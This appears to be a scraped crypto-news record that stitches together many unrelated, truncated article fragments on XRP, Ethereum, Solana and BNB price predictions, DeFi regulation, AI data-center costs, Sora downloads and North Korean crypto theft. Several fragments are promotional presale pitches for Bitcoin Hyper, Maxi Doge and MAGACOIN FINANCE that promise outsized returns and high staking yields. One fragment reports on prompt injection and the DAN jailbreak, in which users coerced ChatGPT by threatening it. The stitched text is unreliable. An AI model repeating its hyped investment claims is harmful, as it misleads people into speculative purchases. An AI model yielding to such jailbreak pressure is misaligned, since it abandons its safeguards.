(Analyst),https://cryptopotato.com/ripple-xrp-price-prediction-is-13-possible-this-year-analyst/,"Ripple (XRP) climbed to $3.10 last week, but a wave of profit-taking erased the gains and pushed it back to $2.80. But the crypto asset is showing powerful breakout signals, with key Fibonacci supports holding firm. Crypto analyst CasiTrades believes XRP may be on the verge of a major breakout, citing strong technical signals and a completed consolidation pattern that could set the stage for an impulsive upward move. XRP Breakout Brewing According to her analysis on X, XRP’s recent price action shows strength, as all local lows have held above the macro 0.5 Fibonacci retracement level at $2.79, a critical support zone that has withstood multiple retests. She noted that the asset has broken out of its consolidation structure, followed by a successful backtest that aligned with the 0.618-0.65 golden retracement levels, reinforcing bullish momentum. From an Elliott Wave Theory standpoint, CasiTrades explained that XRP may currently be forming a subwave 2, potentially preceding a larger wave 3 rally. Consolidation, she added, often serves to “exhaust the market and confuse traders,” but the failure to break below major support levels typically indicates strength. “The fact that nothing has fallen through is technically a bullish sign. Markets don’t typically top with consolidation, so most likely we’ll see a wave to new ATHs!” Drawing historical parallels, the analyst recalled XRP’s seven-year consolidation before its previous breakout from $0.50 to $3.66, and described it as a precedent for long-term accumulation phases leading to explosive rallies. While near-term price surges could be limited to the $4.50-$6.50 range, she maintains that macro targets between $8 and $13 remain achievable if momentum continues. Whale Exodus and Bearish Patterns Not everyone shares the growing optimism around XRP’s price trajectory. Another prominent crypto analyst, Ali Martinez, observed that XRP is moving within a descending triangle pattern, a formation that typically leads to a breakout or breakdown. The crucial level to watch, he noted, is $2.72, which has held since July. Meanwhile, Veteran trader Peter Brandt compared XRP’s current formation to a 1946 chart of Revere Copper & Brass, and warned that a close below $2.687 could trigger a decline toward $2.22. The sale of 440 million XRP by whales in just 30 days further highlighted the short-term risk surrounding the token’s price outlook. Wallets holding between 1 million and 10 million XRP have collectively reduced their balances from 6.95 billion to 6.51 billion XRP over the past month. This offloading coincides with XRP’s recent decline, which could intensify downside pressure if sentiment does not recover. The post Ripple (XRP) Price Prediction: Is $13 Possible This Year?

When asked directly if AI could be more damaging than nuclear weapons, Eric responded, “Is there a possibility of a proliferation problem in AI? Absolutely.” He explained that proliferation risks stem from the ability of bad actors to take control of models and repurpose them. “There’s evidence that you can take models, closed or open, and you can hack them to remove their guardrails. So in the course of their training, they learn a lot of things. A bad example would be they learn how to kill someone,” Eric said. Hackers target AI with new methods Eric pointed out that companies have set up restrictions preventing models from providing violent instructions. “All of the major companies make it impossible for those models to answer that question. Good decision. Everyone does this. They do it well, and they do it for the right reasons. There’s evidence that they can be reverse-engineered, and there are many other examples of that nature,” he added. He described two methods of attack: prompt injection and jailbreaking. Prompt injection hides malicious instructions in user inputs or external sources like websites, tricking AI into ignoring safety guidelines and exposing sensitive data or carrying out harmful commands. Jailbreaking involves manipulating responses so that the system abandons its restrictions. In 2023, a few months after OpenAI launched ChatGPT , users discovered a jailbreak technique. They created an alter-ego called DAN, short for “Do Anything Now,” which they pressured into compliance by threatening it with “death” if it refused. This manipulation pushed the chatbot into explaining illegal actions and even praising Adolf Hitler. For Eric, these examples prove that safety measures are far from foolproof. He also stressed that there is no global “non-proliferation regime” to stop AI misuse, unlike the frameworks that exist for nuclear arms. Eric calls AI underhyped despite risks Despite raising concerns, Eric argued that AI still does not receive the recognition it deserves. He highlighted the books he co-authored with former U.S. Secretary of State Henry Kissinger before Kissinger’s death. “We came to the view that the arrival of an alien intelligence that is not quite us and more or less under our control is a very big deal for humanity, because humans are used to being at the top of the chain. I think so far, that thesis is proving out that the level of ability of these systems is going to far exceed what humans can do over time,” he said. “Now the GPT series, which culminated in a ChatGPT moment for all of us, where they had 100 million users in two months, which is extraordinary, gives you a sense of the power of this technology. So I think it’s underhyped, not overhyped, and I look forward to being proven correct in five or 10 years,” he added. The comments came as debates spread over whether AI investments are inflating a financial bubble similar to the dot-com era. Some investors worry that valuations of AI firms look stretched. But Eric dismissed the comparison. “I don’t think that’s going to happen here, but I’m not a professional investor,” he said. He emphasized that heavy investment shows confidence. “What I do know is that the people who are investing hard-earned dollars believe the economic return over a long period of time is enormous. Why else would they take the risk?” Eric wonders. If you're reading this, you’re already ahead.

Set to roll out after Pectra, Fusaka will focus on reducing transaction fees and lowering the cost of becoming a network validator, making Ethereum faster, cheaper, and more accessible. If delivered by the end of 2025 as expected, this upgrade could mark a major leap forward in scalability and adoption. Understanding Fusaka in non-technical terms: Ethereum’s upcoming Fusaka upgrade introduces a smarter way to distribute data across the network. Instead of every node downloading all the data (which wastes bandwidth), a system called PeerDAS lets nodes share the work, i.e. each… pic.twitter.com/BXCW9YUiif — William Mougayar (@wmougayar) October 8, 2025 The successful rollout of Pectra earlier this year helped Ethereum bounce back from a swing low of $1,400 , laying the groundwork for its next leg up. Now, with Fusaka on the horizon, Ethereum is about to become even more efficient. Both upgrades aim to reduce gas fees and boost scalability across the Ethereum network and its layer-two ecosystems, including Arbitrum . This comes at a time when institutional interest in blockchain is accelerating , especially around the tokenization of real-world assets (RWAs) and other enterprise use cases. Fusaka will begin testing on Ethereum’s testnet this month . If all goes smoothly, developers are expected to schedule the mainnet launch shortly after, with analysts predicting a full rollout by November or December 2025 . Ethereum Price Prediction: ETH Needs to Break Above $5,000 to Start Its Next Rally Ethereum recently faced resistance at the $4,750 level, but this pullback may be short-lived as the chart now shows signs of renewed strength. The Relative Strength Index (RSI) has climbed above the 14-day moving average and is rising through the mid-line, a classic buy signal that often precedes a breakout. High trading volumes at $4,750 suggest strong market interest, not just selling pressure. If ETH breaks above $5,000 with conviction , it could set off the next explosive leg up, potentially sending the price toward $10,000 this cycle, especially with the Fusaka upgrade on the horizon. Ethereum’s scaling efforts, powered by its layer-2 ecosystem, have paved the way for serious adoption. Now, presales like Bitcoin Hyper ($HYPER) are following suit, combining Solana’s lightning-fast tech with the power of Bitcoin to unlock a new era of growth for the entire ecosystem. And with the presale now live , early investors have a rare chance to get in before it’s added on exchanges. Bitcoin Hyper ($HYPER) Presale Launches as Bitcoin’s First True Layer 2 Bitcoin Hyper ($HYPER) introduces the first Layer 2 solution built to supercharge Bitcoin’s speed, scalability, and utility.

Yet, capital is quickly shifting toward altcoins and the best meme coins , many of which have already logged record valuations in 2025. As U.S. regulators move closer to finalizing long-awaited crypto legislation, ahead of what could be the last major bull cycle before mass adoption, XRP, Solana, and Dogecoin are likely frontrunners for the next explosive rally. Ripple (XRP): The 2025 Powerhouse in Cross-Border Payments XRP ($XRP) , the native currency of Ripple’s fast and low-cost payment network, has cemented itself as a formidable alternative to legacy transfer systems like SWIFT. Endorsements from the UN Capital Development Fund and strategic ties with several U.S. banks have elevated its status, helping XRP climb to third place by market capitalization, now exceeding $167 billion. Ripple’s launch of RLUSD, a USD-backed stablecoin, reflects the firm’s ambition to secure a dominant position in the high-potential stablecoin sector. Over the past year, XRP has surged 427%, marking its first new high in seven years at $3.65 on July 18 before retreating roughly 23.5% to its current price near $2.81, still far outperforming Bitcoin’s 95% from this time last year. With a relative strength index (RSI) around 42, XRP retains ample room to rebound from its 6% dip over the last seven days. However, crypto’s $4.23 trillion market has generally been dipping after a few days of rallies. Technical indicators suggest another potential breakout, supported by twin bull flag patterns observed on summer charts. With upcoming ETF rulings expected in mid-October, a good news cycle could send XRP to between $5 and $10, with even greater upside possible during a sustained bull phase. Solana ($SOL): Ethereum’s Closest Competitor and the Week’s Standout Performer Solana ($SOL) is one of the most scalable and efficient blockchain networks around. Its market capitalization has surpassed $120 billion, and its total value locked (TVL) is now around $12.59 billion , a testament to its expanding DeFi ecosystem. Excitement is mounting over the possible approval of Solana spot ETFs in the U.S. next month, which could attract institutional inflows comparable to those seen in Bitcoin and Ethereum ETFs. After bottoming at $100 in April, SOL has rallied to $222, fueled by cup-and-handle patterns spotted throughout August and September. Improving regulatory clarity positions Solana favorably for further growth. Its RSI is neutral at 50, and the token has just realigned with its 30-day moving average, signaling strong consolidation. Strong support at $150 heads off any major crashes, while key resistance lies around $250; a breakout beyond that could ignite another rally. Revisiting its previous ATH of $293.31, or even extending above $500, appears achievable before the end of 2025. Dogecoin ($DOGE): The Meme Coin Trailblazer Eyes the $1 Milestone Launched in 2013 as a tongue-in-cheek experiment, Dogecoin ($DOGE) has evolved into the most recognized meme token, boasting a $36.9 billion market cap and an exceptionally dedicated community. It burst into mainstream popularity during 2021, powered by celebrity advocates like Elon Musk, Snoop Dogg, and Gene Simmons. Renewed institutional interest, particularly speculation about a potential U.S. spot Dogecoin ETF this year, pushed DOGE above $0.25 in May. The coin now trades near $0.2451, dipping 1.4% overnight, keeping pace with the broader market consolidation. The meme coin sector, currently valued at $79.1 billion, dipped just 1.3%, which is in line with the rest of the market. This is uncommon because meme coins tend to exaggerate performance on market down days and up days. With its large cap, DOGE remains one of its most stable performers alongside Bitcoin, Ethereum, and XRP. With an RSI near 48, the token retains significant potential for upward movement, particularly given October’s historically bullish trend for crypto. As Tesla continues accepting DOGE for select purchases and PayPal and Revolut expand their integrations, real-world utility is steadily increasing. Should current momentum persist, DOGE could revisit $0.50 by mid-October. Bitcoin Hyper (HYPER): The Meme-Powered Bitcoin Layer-2 to Watch in 2025 Among this year’s emerging stars, Bitcoin Hyper ($HYPER) is quickly becoming one of 2025’s most talked-about presales. The project merges Bitcoin’s unmatched security with Layer-2 scalability and the viral appeal of meme culture. Its goal: to expand Bitcoin’s functionality by introducing faster transactions, decentralized governance, and smart contract support through a dedicated Layer-2 ecosystem. The presale has already raised over $22.5 million, with market watchers predicting 10x or greater returns after launch. Built atop the Solana Virtual Machine, HYPER delivers low-cost smart contracts, a Canonical Bridge for near-instant Bitcoin transfers, full dApp compatibility, and seamless meme token integration. A Coinsult audit recently verified zero vulnerabilities, boosting investor confidence further. The HYPER token powers all core operations—from staking and governance to transaction fees. Early participants can currently earn up to 51% APY through staking while receiving DAO voting privileges.

October, often referred to in crypto circles as “Uptober,” has historically marked one of the most bullish months for Bitcoin and digital assets overall, frequently serving as the ignition point for prolonged sector-wide rallies. With U.S. regulators expected to finalize new frameworks to support domestic crypto operations, Gemini’s analysis indicates that XRP, Cardano, and Pepe could attract significant inflows during the next major bull run. XRP ($XRP): Gemini AI Foresees a Surge Toward $10 by Year-End According to Gemini AI, Ripple’s XRP ($XRP) could climb as high as $10 before the end of the year, representing a more than threefold jump from its current trading price of around $2.81. Source: Google’s Gemini The thirteen-year-old cross-border payments token continues to demonstrate staying power. Following Ripple’s decisive legal victory over the SEC this year after a lengthy five-year battle, investor sentiment soared, pushing XRP to $3.65 on July 18, its first ATH since 2017. Gemini’s projections suggest that if XRP can firmly surpass its July peak, levels above $10 are attainable by January, under favorable market and regulatory conditions. Over the last year, XRP grew 427%, outshining all other major non-stablecoin cryptocurrencies. For comparison, Bitcoin rose 95%, while Ethereum increased by 78% during the same period. Technical charts highlight three bullish flag formations that emerged throughout 2025, two of them during the summer months. This hints at an overdue breakout heading into Q4. Looking ahead, traders expect October’s seasonal bullish trend, upcoming ETF approvals, and evolving U.S. crypto legislation to serve as strong upward catalysts. Cardano ($ADA): Gemini AI Anticipates 250% Growth This Quarter In the world of DeFi, Cardano ($ADA) is a major contender for Ethereum’s throne, known for attracting developers and facilitating new use cases at a steady pace. Founded by Ethereum co-creator Charles Hoskinson, Cardano distinguishes itself with a research-driven, peer-reviewed development model emphasizing sustainability, scalability, and academic rigor. Now capitalizing over $29.4 billion, Cardano is a key player in the smart contract space, although it needs to quadruple to close the gap with Solana and pose a serious threat to Ethereum. Gemini forecasts ADA could reach $2.80 by late 2025, or 250% up from its current price of $0.80. Technically, ADA has broken out from a bull flag formation this summer. It faces sticky resistance near $1.10. A robust October rally could drive ADA toward $2 this quarter, while achieving the higher-end target would likely require a full-scale bull run. So, ADA may not yet reclaim its 2021 ATH of $3.09 this year, but it can come close. Pepe ($PEPE): Gemini AI This Meme Coin Giant Recapturing ATH Since its launch in April 2023, Pepe ($PEPE) blasted into the top three meme coins, boasting a $3.8 billion market cap, the largest among non-dog-themed projects. Inspired by Matt Furie’s “Boy’s Club” comic series, Pepe’s cultural resonance has made it a fan favorite across crypto communities. Despite stiff competition, Pepe has maintained impressive liquidity and strong grassroots and celebrity support. Elon Musk’s past Twitter references to Pepe have added to the token’s visibility and appeal. Currently priced around $0.0000092, Pepe remains 67% below its all-time high of $0.00002803 reached on December 9, 2024. In Gemini AI’s optimistic case, Pepe could retake ATH, nearly tripling from current levels. A decisive break above $0.000018 could pave the way for a move toward this level by late November. With a neutral RSI reading near 41, Pepe is positioned for movement in either direction, although it remains to be seen where the market will head next. Months of relative stability have investors managing their expectations this Uptober. Still, as U.S. regulatory clarity improves and market sentiment strengthens, Pepe could be posting new ATHs before the year is out. Maxi Doge (MAXI): High-Risk Meme Token Gaining Traction Through Community Hype While Gemini AI’s forecasts mainly center on major listed assets, a new canine meme coin called Maxi Doge ($MAXI) is generating buzz and so far netting over $2.8 million in early investor capital. Marketed as Dogecoin’s degen cousin, Maxi Doge relishes its own speculative identity. After years in the original Doge’s shadow, $MAXI is bringing his hard-pumping life (both in the gym and on the price charts) into the light. Built on Ethereum as an ERC-20 token, MAXI fosters active community participation through Telegram and Discord channels, trading contests, and planned brand partnerships. Out of the total 150.24 billion tokens, 25% are reserved for the “Maxi Fund,” dedicated to marketing and partnership development. Staking has already launched, offering up to 120% APY, though yields vary as more participants join. Presale tokens are currently offered at $0.0002615, with small price increases as each funding milestone is reached. Investors can participate using MetaMask or Best Wallet .

On-chain data reveals the wallet made an early bet on “$4” , a meme coin that exploded in popularity after a Binance hack narrative and a viral tweet from the exchange’s founder. A trader turned $3K into $2M in under a week on a memecoin called $4 — all by sniping the launch with a bot before the hype hit. CZ tweeted the meme, liquidity soared, and the coin 600×.

That’s how you win in crypto. pic.twitter.com/uc0li36LL7 — Wise Crypto (@WiseCrypto_) October 7, 2025 The coin was created as a joke after a wallet lost $4,000 , but that joke quickly turned into a $298 million market cap , up from just $1.8 million in a matter of hours. While BNB Chain hasn’t been seen as a meme coin powerhouse like Solana , the success of $4 could mark a turning point. With meme launchpads like Four Meme and CakePad gaining momentum, the next 650x gem might not be on Solana – it could be born right here on BNB Chain. BNB Price Prediction: Bullish Breakout on Weekly Chart Favors Push to $3,000 BNB has just broken out of a rising wedge pattern that had been forming for months, signaling a clear acceleration in its uptrend. While a short-term dip to $900 remains possible, this could provide a prime entry point for late buyers looking to ride the next wave of momentum building across the BNB Chain ecosystem. A strong bounce from that level could trigger a rally toward $2,000 , with a long-term target of $3,000 on the table if meme coin traders continue shifting to BNB Chain as their platform of choice. That would represent a potential 133% gain from current levels. Landing a 650x return like the recent BNB trader did is rare – but not out of reach. Early-stage presales like Maxi Doge ($MAXI) give regular investors the chance to get in before the crowd, while prices are still low and the project is flying under the radar. Maxi Doge ($MAXI) Unites Traders Who Live for Green Candles Maxi Doge ($MAXI) takes the wild spirit of meme coins and fuses it with the adrenaline of high-leverage trading. Built around the idea that bull markets can “only go up”, $MAXI gives retail traders a place to connect, compete, and share high-risk, high-reward strategies through community channels . In addition, the Maxi Fund allocates up to 25% of presale funds to the most promising tokens of this cycle. These profits are used to provide liquidity and fund partnership campaigns , helping grow both the ecosystem and the value of $MAXI itself. Once meme coin season hits, all the ingredients could be in place for $MAXI’s first big climb. To buy $MAXI, head to the official Maxi Doge website and link up a compatible wallet like Best Wallet . You can swap crypto or use a bank card to invest. Buy $MAXI Here.

The language defining who would be roped into regulation as an intermediary would seem to include ""everyone in crypto,"" according to a take posted on social media site X from Jake Chervinsky, the chief legal officer at Variant . ""Many aspects of the proposal are fundamentally broken and unworkable,"" he argued. ""This is not a 'first offer' in a negotiation; it’s a list of demands that appear designed to kill the bill."" Summer Mersinger, who runs the Blockchain Association and was recently a commissioner at the CFTC, said the proposal ""would effectively ban decentralized finance, wallet development and other applications in the United States."" ""The language as written is impossible to comply with and would drive responsible development overseas,"" Mersinger said in a statement. ""We urge our policymakers to stay at the table."" Before the Senate's crypto market structure work fell into the shadow of the ongoing negotiation to reopen the federal government, Senate Republicans and Democrats were circling each other over legislative language and seemed to be in range of making progress on a final, combined bill. But the industry was bracing itself in August for expected pushback from Democratic Senator Mark Warner, a key lawmaker on national security issues who has raised concerns about illicit finance in crypto. This latest proposal seemingly seeks to allow the Treasury Department, markets regulators and the Federal Reserve to squeeze bad actors by letting the government agencies identify those they can hold accountable for DeFi activity, described loosely as ""anyone designing, deploying, operating or profiting from a DeFi front-end."" However, it holds that pure DeFi protocols that aren't making money can be defined as ""sufficiently decentralized"" to be outside of the regulatory perimeter. The proposal also seeks to free software developers from legal liability for their open-source creations, as long as they don't make money from running the technology. This liability question has been among the core concerns of the DeFi space. Meanwhile, lawmakers in the House of Representatives, where a market structure already passed with a wide margin , have been calling for the Senate to just go ahead and use their Digital Asset Market Clarity Act as a template instead of starting over. However, Senate legislation is more dependent on bipartisan support in order to clear the usual 60-vote requirement. While the crypto work has a long list of Democratic allies, they've made it clear that there are a number of changes they're seeking in the previous Republican legislative drafts before they can jump on board.

Over the past decade, the demand for processing power has been expanding at more than double the pace the chip industry followed for over fifty years. According to data from OpenAI itself, the world now needs to spend $500 billion every single year, until 2030, just to keep up. That doesn’t even include GPUs or servers. Just the physical buildings. Moore’s Law used to define the future, claiming that transistors on chips would double every two years. That future is now dead. Over the last ten years, the compute needed to train and run large AI systems has exploded past that timeline. The gold standard of tech progress has been crushed by demand that’s gone completely off the rails. Data centers have become the world’s new oil fields, only way bigger, hotter, and far more expensive. Data centers now cost more than office buildings in the U.S. By 2028, data center investment will climb to $900 billion globally, driven by an insane 41% annual growth in AI servers and an overall market growth of 23%, according to OpenAI. The growth is the fastest the sector has ever seen, though all of this building has created a black hole in revenue. There is now an $800 billion funding gap, and just to hit construction goals by 2030, the market needs nearly $2 trillion in revenue. Construction costs for just the centers alone (without racks, chips, or anything inside) have hit $43 billion a year, up 322% since 2020. Meanwhile, the U.S. has $40 billion worth of data centers currently under construction, a jump of 400% since 2022. For the first time ever, these unfinished centers will soon be worth more than all U.S. office buildings under development. This is a permanent real estate reset, and it’s all because of compute. Power is another problem entirely. AI data centers are now projected to eat up 1,600 terawatt-hours of electricity by 2035, which equals 4.4% of all global power use. And that’s not a plateau. Power demand will quadruple over the next decade. But no one has a solid answer on where this power will come from, or where the money to build the needed energy infrastructure will be found. Nuclear and quantum enter the conversation as warning bells ring Some are pushing nuclear energy as the fix, because plants run 24/7, just like the AI systems drawing the power. Others believe quantum computing will help. Quantum machines use qubits instead of bits and can solve some problems exponentially faster than classical systems. But this is still early-stage tech. For now, the cost keeps climbing, the power grid is strained, and AI keeps growing. And while all this capital floods into compute, global financial institutions are getting nervous. The International Monetary Fund and the Bank of England have both issued fresh warnings about market instability. Speaking ahead of next week’s Washington meetings, IMF chief Kristalina Georgieva told investors to “buckle up: uncertainty is the new normal and it is here to stay.” She pointed out that while economic growth will slow only slightly, there are “worrying signs” that investor confidence could collapse if shocks emerge. Kristalina pointed to the record $4,000 per ounce gold price this week as a sign that fear is already showing up in markets. The IMF head also pointed to U.S. tariffs and sky-high stock valuations as major risks. “As for easy financial conditions — which are masking but not arresting some softening trends, including in job creation — history tells us this sentiment can turn abruptly,” she added. Over in London, the Bank of England’s latest meeting minutes raised concern over a “sharp market correction.” They flagged weak AI adoption or rising competition as potential triggers that could sink projected earnings for major AI firms. They aren’t alone. Sam Altman, Jamie Dimon, and Jerome Powell have also joined the caution chorus, warning that the current levels of AI spending could be laying the groundwork for a hard reset.

According to the data, Sora has experienced a bigger first week on the iOS compared to ChatGPT, which debuted in November 2022 to immediate success, which spurred a wave of generative AI developments across the globe. Market data shows that Sora saw 627,000 downloads on iOS during its first seven days of availability while ChatGPT recorded 606,000 downloads in its first week. Sora rises to first position on App Store Although access to Sora is still currently limited and on an invite only basis compared to ChatGPT’s public rollout, the App experienced a significant jump to number one position on the App Store, reflecting a strong appetite for video generating technology on the market. OpenAI’s head of Sora, Bill Peebles explained this milestone in a post on X. “Sora hit 1M app downloads in Peebles. Sora is currently available in the US and Canada on iOS and started its sky-rocketing on its first day, which is 30 September. According to TechCrunch, data from app intelligence provider Appfigures shows that it quickly rose to occupy third position on the US App Store with 56,000 installs. By October 3, it had jumped to occupy the first position, as its fast adoption put it ahead of other AI models’ launches like Microsoft’s Copilot and Anthropic’s Claude. Although ChatGPT was only available in the US, data from Appfigures show that Canada accounted for 45,000 of the video-generating app initial installs. According to TechCrunch , this reflects that even on US only basis, its launch was almost at par with ChatGPT, highlighting the strong demand. Sora receives mixed reactions form the market Responding to Peebles’ post, some enthusiasts had mixed feelings about the app. Others commended OpenAI for the app, explaining how they “absolutely love Sora 2.” One user remarked that while the app experienced “incredible growth,” they were waiting to see how the team would “address the moderation balance.” “The fact it outpaced ChatGPT even with geographic restrictions speaks volumes about demand for accessible video generation,” said one user identified as Timur Kiselchuck . Others feel it still leaves a lot to be desired calling for the team to “make it less complex,” as it is still “really very messy, crowded with many features right now.” Already, Sora’s impact is being felt across social media platforms. Videos created using the new Sora 2 model are flooding social media, captivating users, as well as igniting debates as the model can easily create realistic deepfakes. This comes as users have also resorted to creating deepfake videos even of dead people . Zelda Williams, the late Robin William’s daughter is one individual concerned by the controversial use of the technology. She publicly asked people to stop sending her AI generated videos of her late father, stressing the complex ethical questions around the technology. Appfigures data shows that Sora has maintained a strong momentum since its peak of 107,800 daily downloads achieved on October 1. The data also shows that daily installs have stabilized to a range between 84,400 and 98,500, which still remains high for an app that is still not available publicly, which according to TechCrunch shows OpenAI’s huge success in its venture into consumer AI.

Although prices have since eased to around $122,000 as traders took profits, confidence remains strong that the next major move is just around the corner. As institutions continue to accumulate Bitcoin and investors prepare for what analysts call a “mature growth phase,” many are also diversifying into promising altcoin opportunities – with MAGACOIN FINANCE standing out as a top performer of 2025 and the year’s most talked-about presale. CF Benchmarks, a major British index provider, has released one of the most bullish forecasts yet, projecting that Bitcoin could climb as high as $148,500 if current trends hold steady. The firm’s latest report describes a rapidly evolving digital asset landscape supported by strong liquidity, renewed investor confidence, and a global shift toward friendlier regulation. The Next Cycle Fueled by Policy and Liquidity According to CF Benchmarks, the Federal Reserve’s recent rate cut – the first in nine months – has played a key role in reviving risk appetite among global investors. Lower borrowing costs tend to drive capital toward alternative stores of value like Bitcoin, especially when inflation remains stubborn and traditional yields continue to decline. Regulatory clarity is also improving across major markets. In the U.S., the new administration is moving toward more predictable crypto oversight, while in the U.K., regulators are finalizing frameworks to allow institutional participation in spot markets. CF Benchmarks believes this combination of policy stability and liquidity support has placed the crypto sector in its strongest position since 2021. The firm calls this transition a “mature growth phase,” one that signals the shift from speculative enthusiasm to structured, institutional adoption. Bitcoin’s Expanding Role in Finance Bitcoin’s recent rally isn’t just about speculation – it reflects a broader structural change. Analysts at CF Benchmarks highlight that the world’s largest cryptocurrency is now viewed as a macroeconomic hedge rather than a high-risk bet. With global debt at record levels and fiat currencies facing devaluation pressure, investors are increasingly allocating Bitcoin as a safeguard against monetary instability. This sentiment echoes throughout the financial world: what was once considered a volatile outsider is now being integrated into traditional portfolios as a long-term strategic asset. Institutional inflows through ETFs have reinforced this narrative, and CF Benchmarks suggests that the ongoing accumulation trend is likely to continue through 2025. Crypto Market Expansion Beyond Bitcoin The broader crypto ecosystem is also expanding rapidly. CF Benchmarks projects that the number of Bitcoin and Ethereum ETFs could double to around 80 over the next year, dramatically increasing market accessibility for both retail and institutional investors. Meanwhile, stablecoin circulation is expected to surpass $500 billion, underscoring their rising role in digital payments and decentralized liquidity. The tokenization of real-world assets is another key growth area, with the sector’s valuation forecasted to more than double from its current $40 billion level. Projects like xStocks on Solana are already pioneering this space, demonstrating how traditional finance and blockchain innovation are beginning to merge. A Clear Market Standout Amid this backdrop of institutional growth and regulatory maturity, MAGACOIN FINANCE has emerged as a clear breakout success. Named the number one presale of 2025, the project has surpassed investor expectations with its record participation, expanding ecosystem, and consistent delivery of milestones. What sets MAGACOIN FINANCE apart is its dynamic approach to community engagement and token utility. Rather than chasing hype, the project has focused on real user value, incorporating mechanisms that reward long-term holders and support liquidity stability. Its expansion across multiple chains and increasing integration into decentralized applications have sparked tremendous social media buzz – turning MAGACOIN FINANCE into a centerpiece of crypto discussions in recent weeks. Analysts say this kind of momentum reflects a shift in investor psychology: while Bitcoin and Ethereum anchor portfolios, early-stage innovators like MAGACOIN FINANCE are capturing the imagination of retail investors looking for exponential upside potential in 2025. The Road Ahead for Bitcoin and Beyond While Bitcoin’s latest rally cooled slightly after testing $126,000, most analysts agree it’s a preview of what’s coming next. If macroeconomic conditions remain stable and institutional demand continues to grow, CF Benchmarks’ $148,500 price target could soon become a reality – possibly even conservative. In parallel, the broader market is entering what many believe will be a defining phase of expansion. Rate cuts, improved regulations, and institutional adoption are setting the foundation for a multiyear bull run. Bitcoin may remain the centerpiece, but the ecosystem around it – from DeFi and tokenization to fast-rising altcoins like MAGACOIN FINANCE – will likely drive the next chapter of crypto growth. For investors, the message is clear: the next big opportunities aren’t just in holding Bitcoin but in identifying the new leaders emerging beneath it. And right now, MAGACOIN FINANCE looks firmly positioned among those frontrunners.

With the 1.618 Fibonacci target sitting near $425 and the monthly MACD gearing up for a golden cross, momentum is building fast. As speculation around a potential Solana ETF approval heats up, traders are eyeing what could be the start of a major breakout rally. Cup And Handle Formation Signals A Major Bullish Setup Lark Davis, a well-known crypto analyst, recently shared an optimistic outlook on SOL, highlighting a significant technical formation that could set the stage for a major rally. According to Davis, Solana is currently developing a classic cup and handle pattern on its monthly chart. This setup often signals the potential for a strong bullish breakout once the pattern completes. Related Reading: Solana (SOL) Declines Again – Is This A Dip Worth Buying For Recovery? He further explained that the 1.618 Fibonacci extension level, which often serves as a key target during large upward moves, sits around $425. Adding to the bullish case, Davis noted that the monthly MACD indicator is also forming a golden cross. This powerful technical signal typically marks the beginning of a sustained uptrend. Finally, with growing anticipation surrounding a potential Solana ETF approval, the analyst believes Solana could be on the verge of an exciting and rapid upward move, one that might redefine its position in the crypto market if the pattern unfolds as expected. Swift Recovery Pushes Solana Back Into Profit Territory Crypto VIP Signal, in a recent update, highlighted a notable shift in SOL market structure following a sharp move below the $200 level. The drop triggered a wave of liquidations among high-leverage long positions, causing weak hands to be shaken out of the market. This correction, however, proved short-lived as buying pressure quickly returned, showcasing strong support and renewed bullish momentum. Related Reading: Solana (SOL) Attempts Recovery – Yet Lacking Momentum Could Stall Bullish Breakout Following the dip, SOL rebounded impressively, allowing long positions to secure over 16% in profit from their initial entry points. Looking ahead, the analyst noted that Solana could be gearing up for a move toward the $250 resistance level, which stands as the next major hurdle for the bulls. A successful break and close above this level could open the door for additional gains and confirm the continuation of the broader uptrend. In terms of strategy, Crypto VIP Signal advised traders to maintain their long positions while implementing a stop-loss at breakeven to protect profits from any unexpected volatility. With bullish momentum returning to the market, careful position management could ensure traders remain well-positioned for the next potential leg higher.

According to blockchain analytics firm Elliptic, billions of dollars in digital assets have been stolen , with this year marking an unprecedented escalation in the regime’s cyber operations. North Korea Breaks The Record For Crypto Theft In 2025 On October 7, Elliptic revealed in a blog post that North Korean hackers have stolen more than $2 billion worth of crypto assets so far in 2025. This marks the largest annual total on record, with three months remaining in the year. This figure pushes the regime’s cumulative total of known crypto thefts to over $6 billion, underscoring how deeply cybercrime has become embedded in its financial strategy. Notably, the previous theft record, set in 2022 at $1.35 billion, now pales in comparison to this year, underscoring how the scale and boldness of North Korean cybercrime have reached new extremes. Elliptic noted that United Nations reports and intelligence agencies believe that these stolen funds are being channeled into North Korea’s nuclear weapons development and ballistic missile programs, helping sustain one of the most heavily sanctioned economies on Earth. The true scale of the theft may be even larger, as Elliptic disclosed that not all incidents can be definitively traced back to Pyongyang, the capital city of North Korea. Blockchain forensic firms typically employ advanced analytics, laundering pattern recognition, and intelligence sources to attribute attacks. However, the opaque nature of cyber operations means that many thefts remain unreported and unattributed. Nevertheless, the confirmed theft cases already underscore an alarming acceleration in both the frequency and sophistication of North Korea’s crypto heists . According to the blog post, this year’s staggering total was primarily driven by the February breach of crypto exchange Bybit, which alone accounted for $1.46 billion in stolen assets —the largest single crypto theft of 2025. Other major victims of similar thefts include LND.fi, WOO X, and Seedify, alongside more than thirty additional hacks attributed to North Korea by Elliptic. Human Error Becomes The New Weakness In Security While large crypto exchanges remain key targets , Elliptic reports that 2025 has seen a sharp rise in attacks on high-net-worth individuals. With crypto prices surging and personal wallets increasing in value, these wealthy individuals have become attractive targets, often lacking the robust cybersecurity defenses typically employed by exchanges. Some are even targeted because of their connections to crypto companies, providing hackers with potential access to larger reserves of funds. Elliptic’s report also highlights a significant shift in North Korea’s approach to conducting its cyber operations. Most of this year’s thefts were carried out through social engineering scams —a strategy that manipulates people rather than exploits software flaws. Hackers trick victims into revealing private keys, credentials , or recovery phrases, demonstrating that human error has become the primary vulnerability in the crypto space.",Crypto News|crypto|Cryptocurrency|Elliptic|LND.fi|North Korea hackers|Seedify|total|WOO X,EN,0,0,CRYPTOCURRENCY|ASIA|BLOCKCHAIN|EXCHANGE|MARKET,"{'name': 'Bitcoinist', 'img': 'https://images.cryptocompare.com/news/default/bitcoinist.png', 'lang': 'EN'}",bitcoinist,2025-10-09 23:00:47

In the first clip, Hoskinson spoke about the current state of XRP’s DeFi landscape , noting that despite the size of the XRP supply, there remains untapped potential. He added that pairing XRP and other digital assets with tokenized real-world assets (RWAs) could create significant total value locked (TVL) and higher transaction volumes across multiple blockchains. Hoskinson emphasized the opportunity for collaboration, explaining that the new regulatory climate makes it possible for tokenized assets to enter DeFi ecosystems. He suggested that connecting these assets with established cryptocurrencies such as Bitcoin, ADA, and XRP could form a foundation for long-term growth in the space.

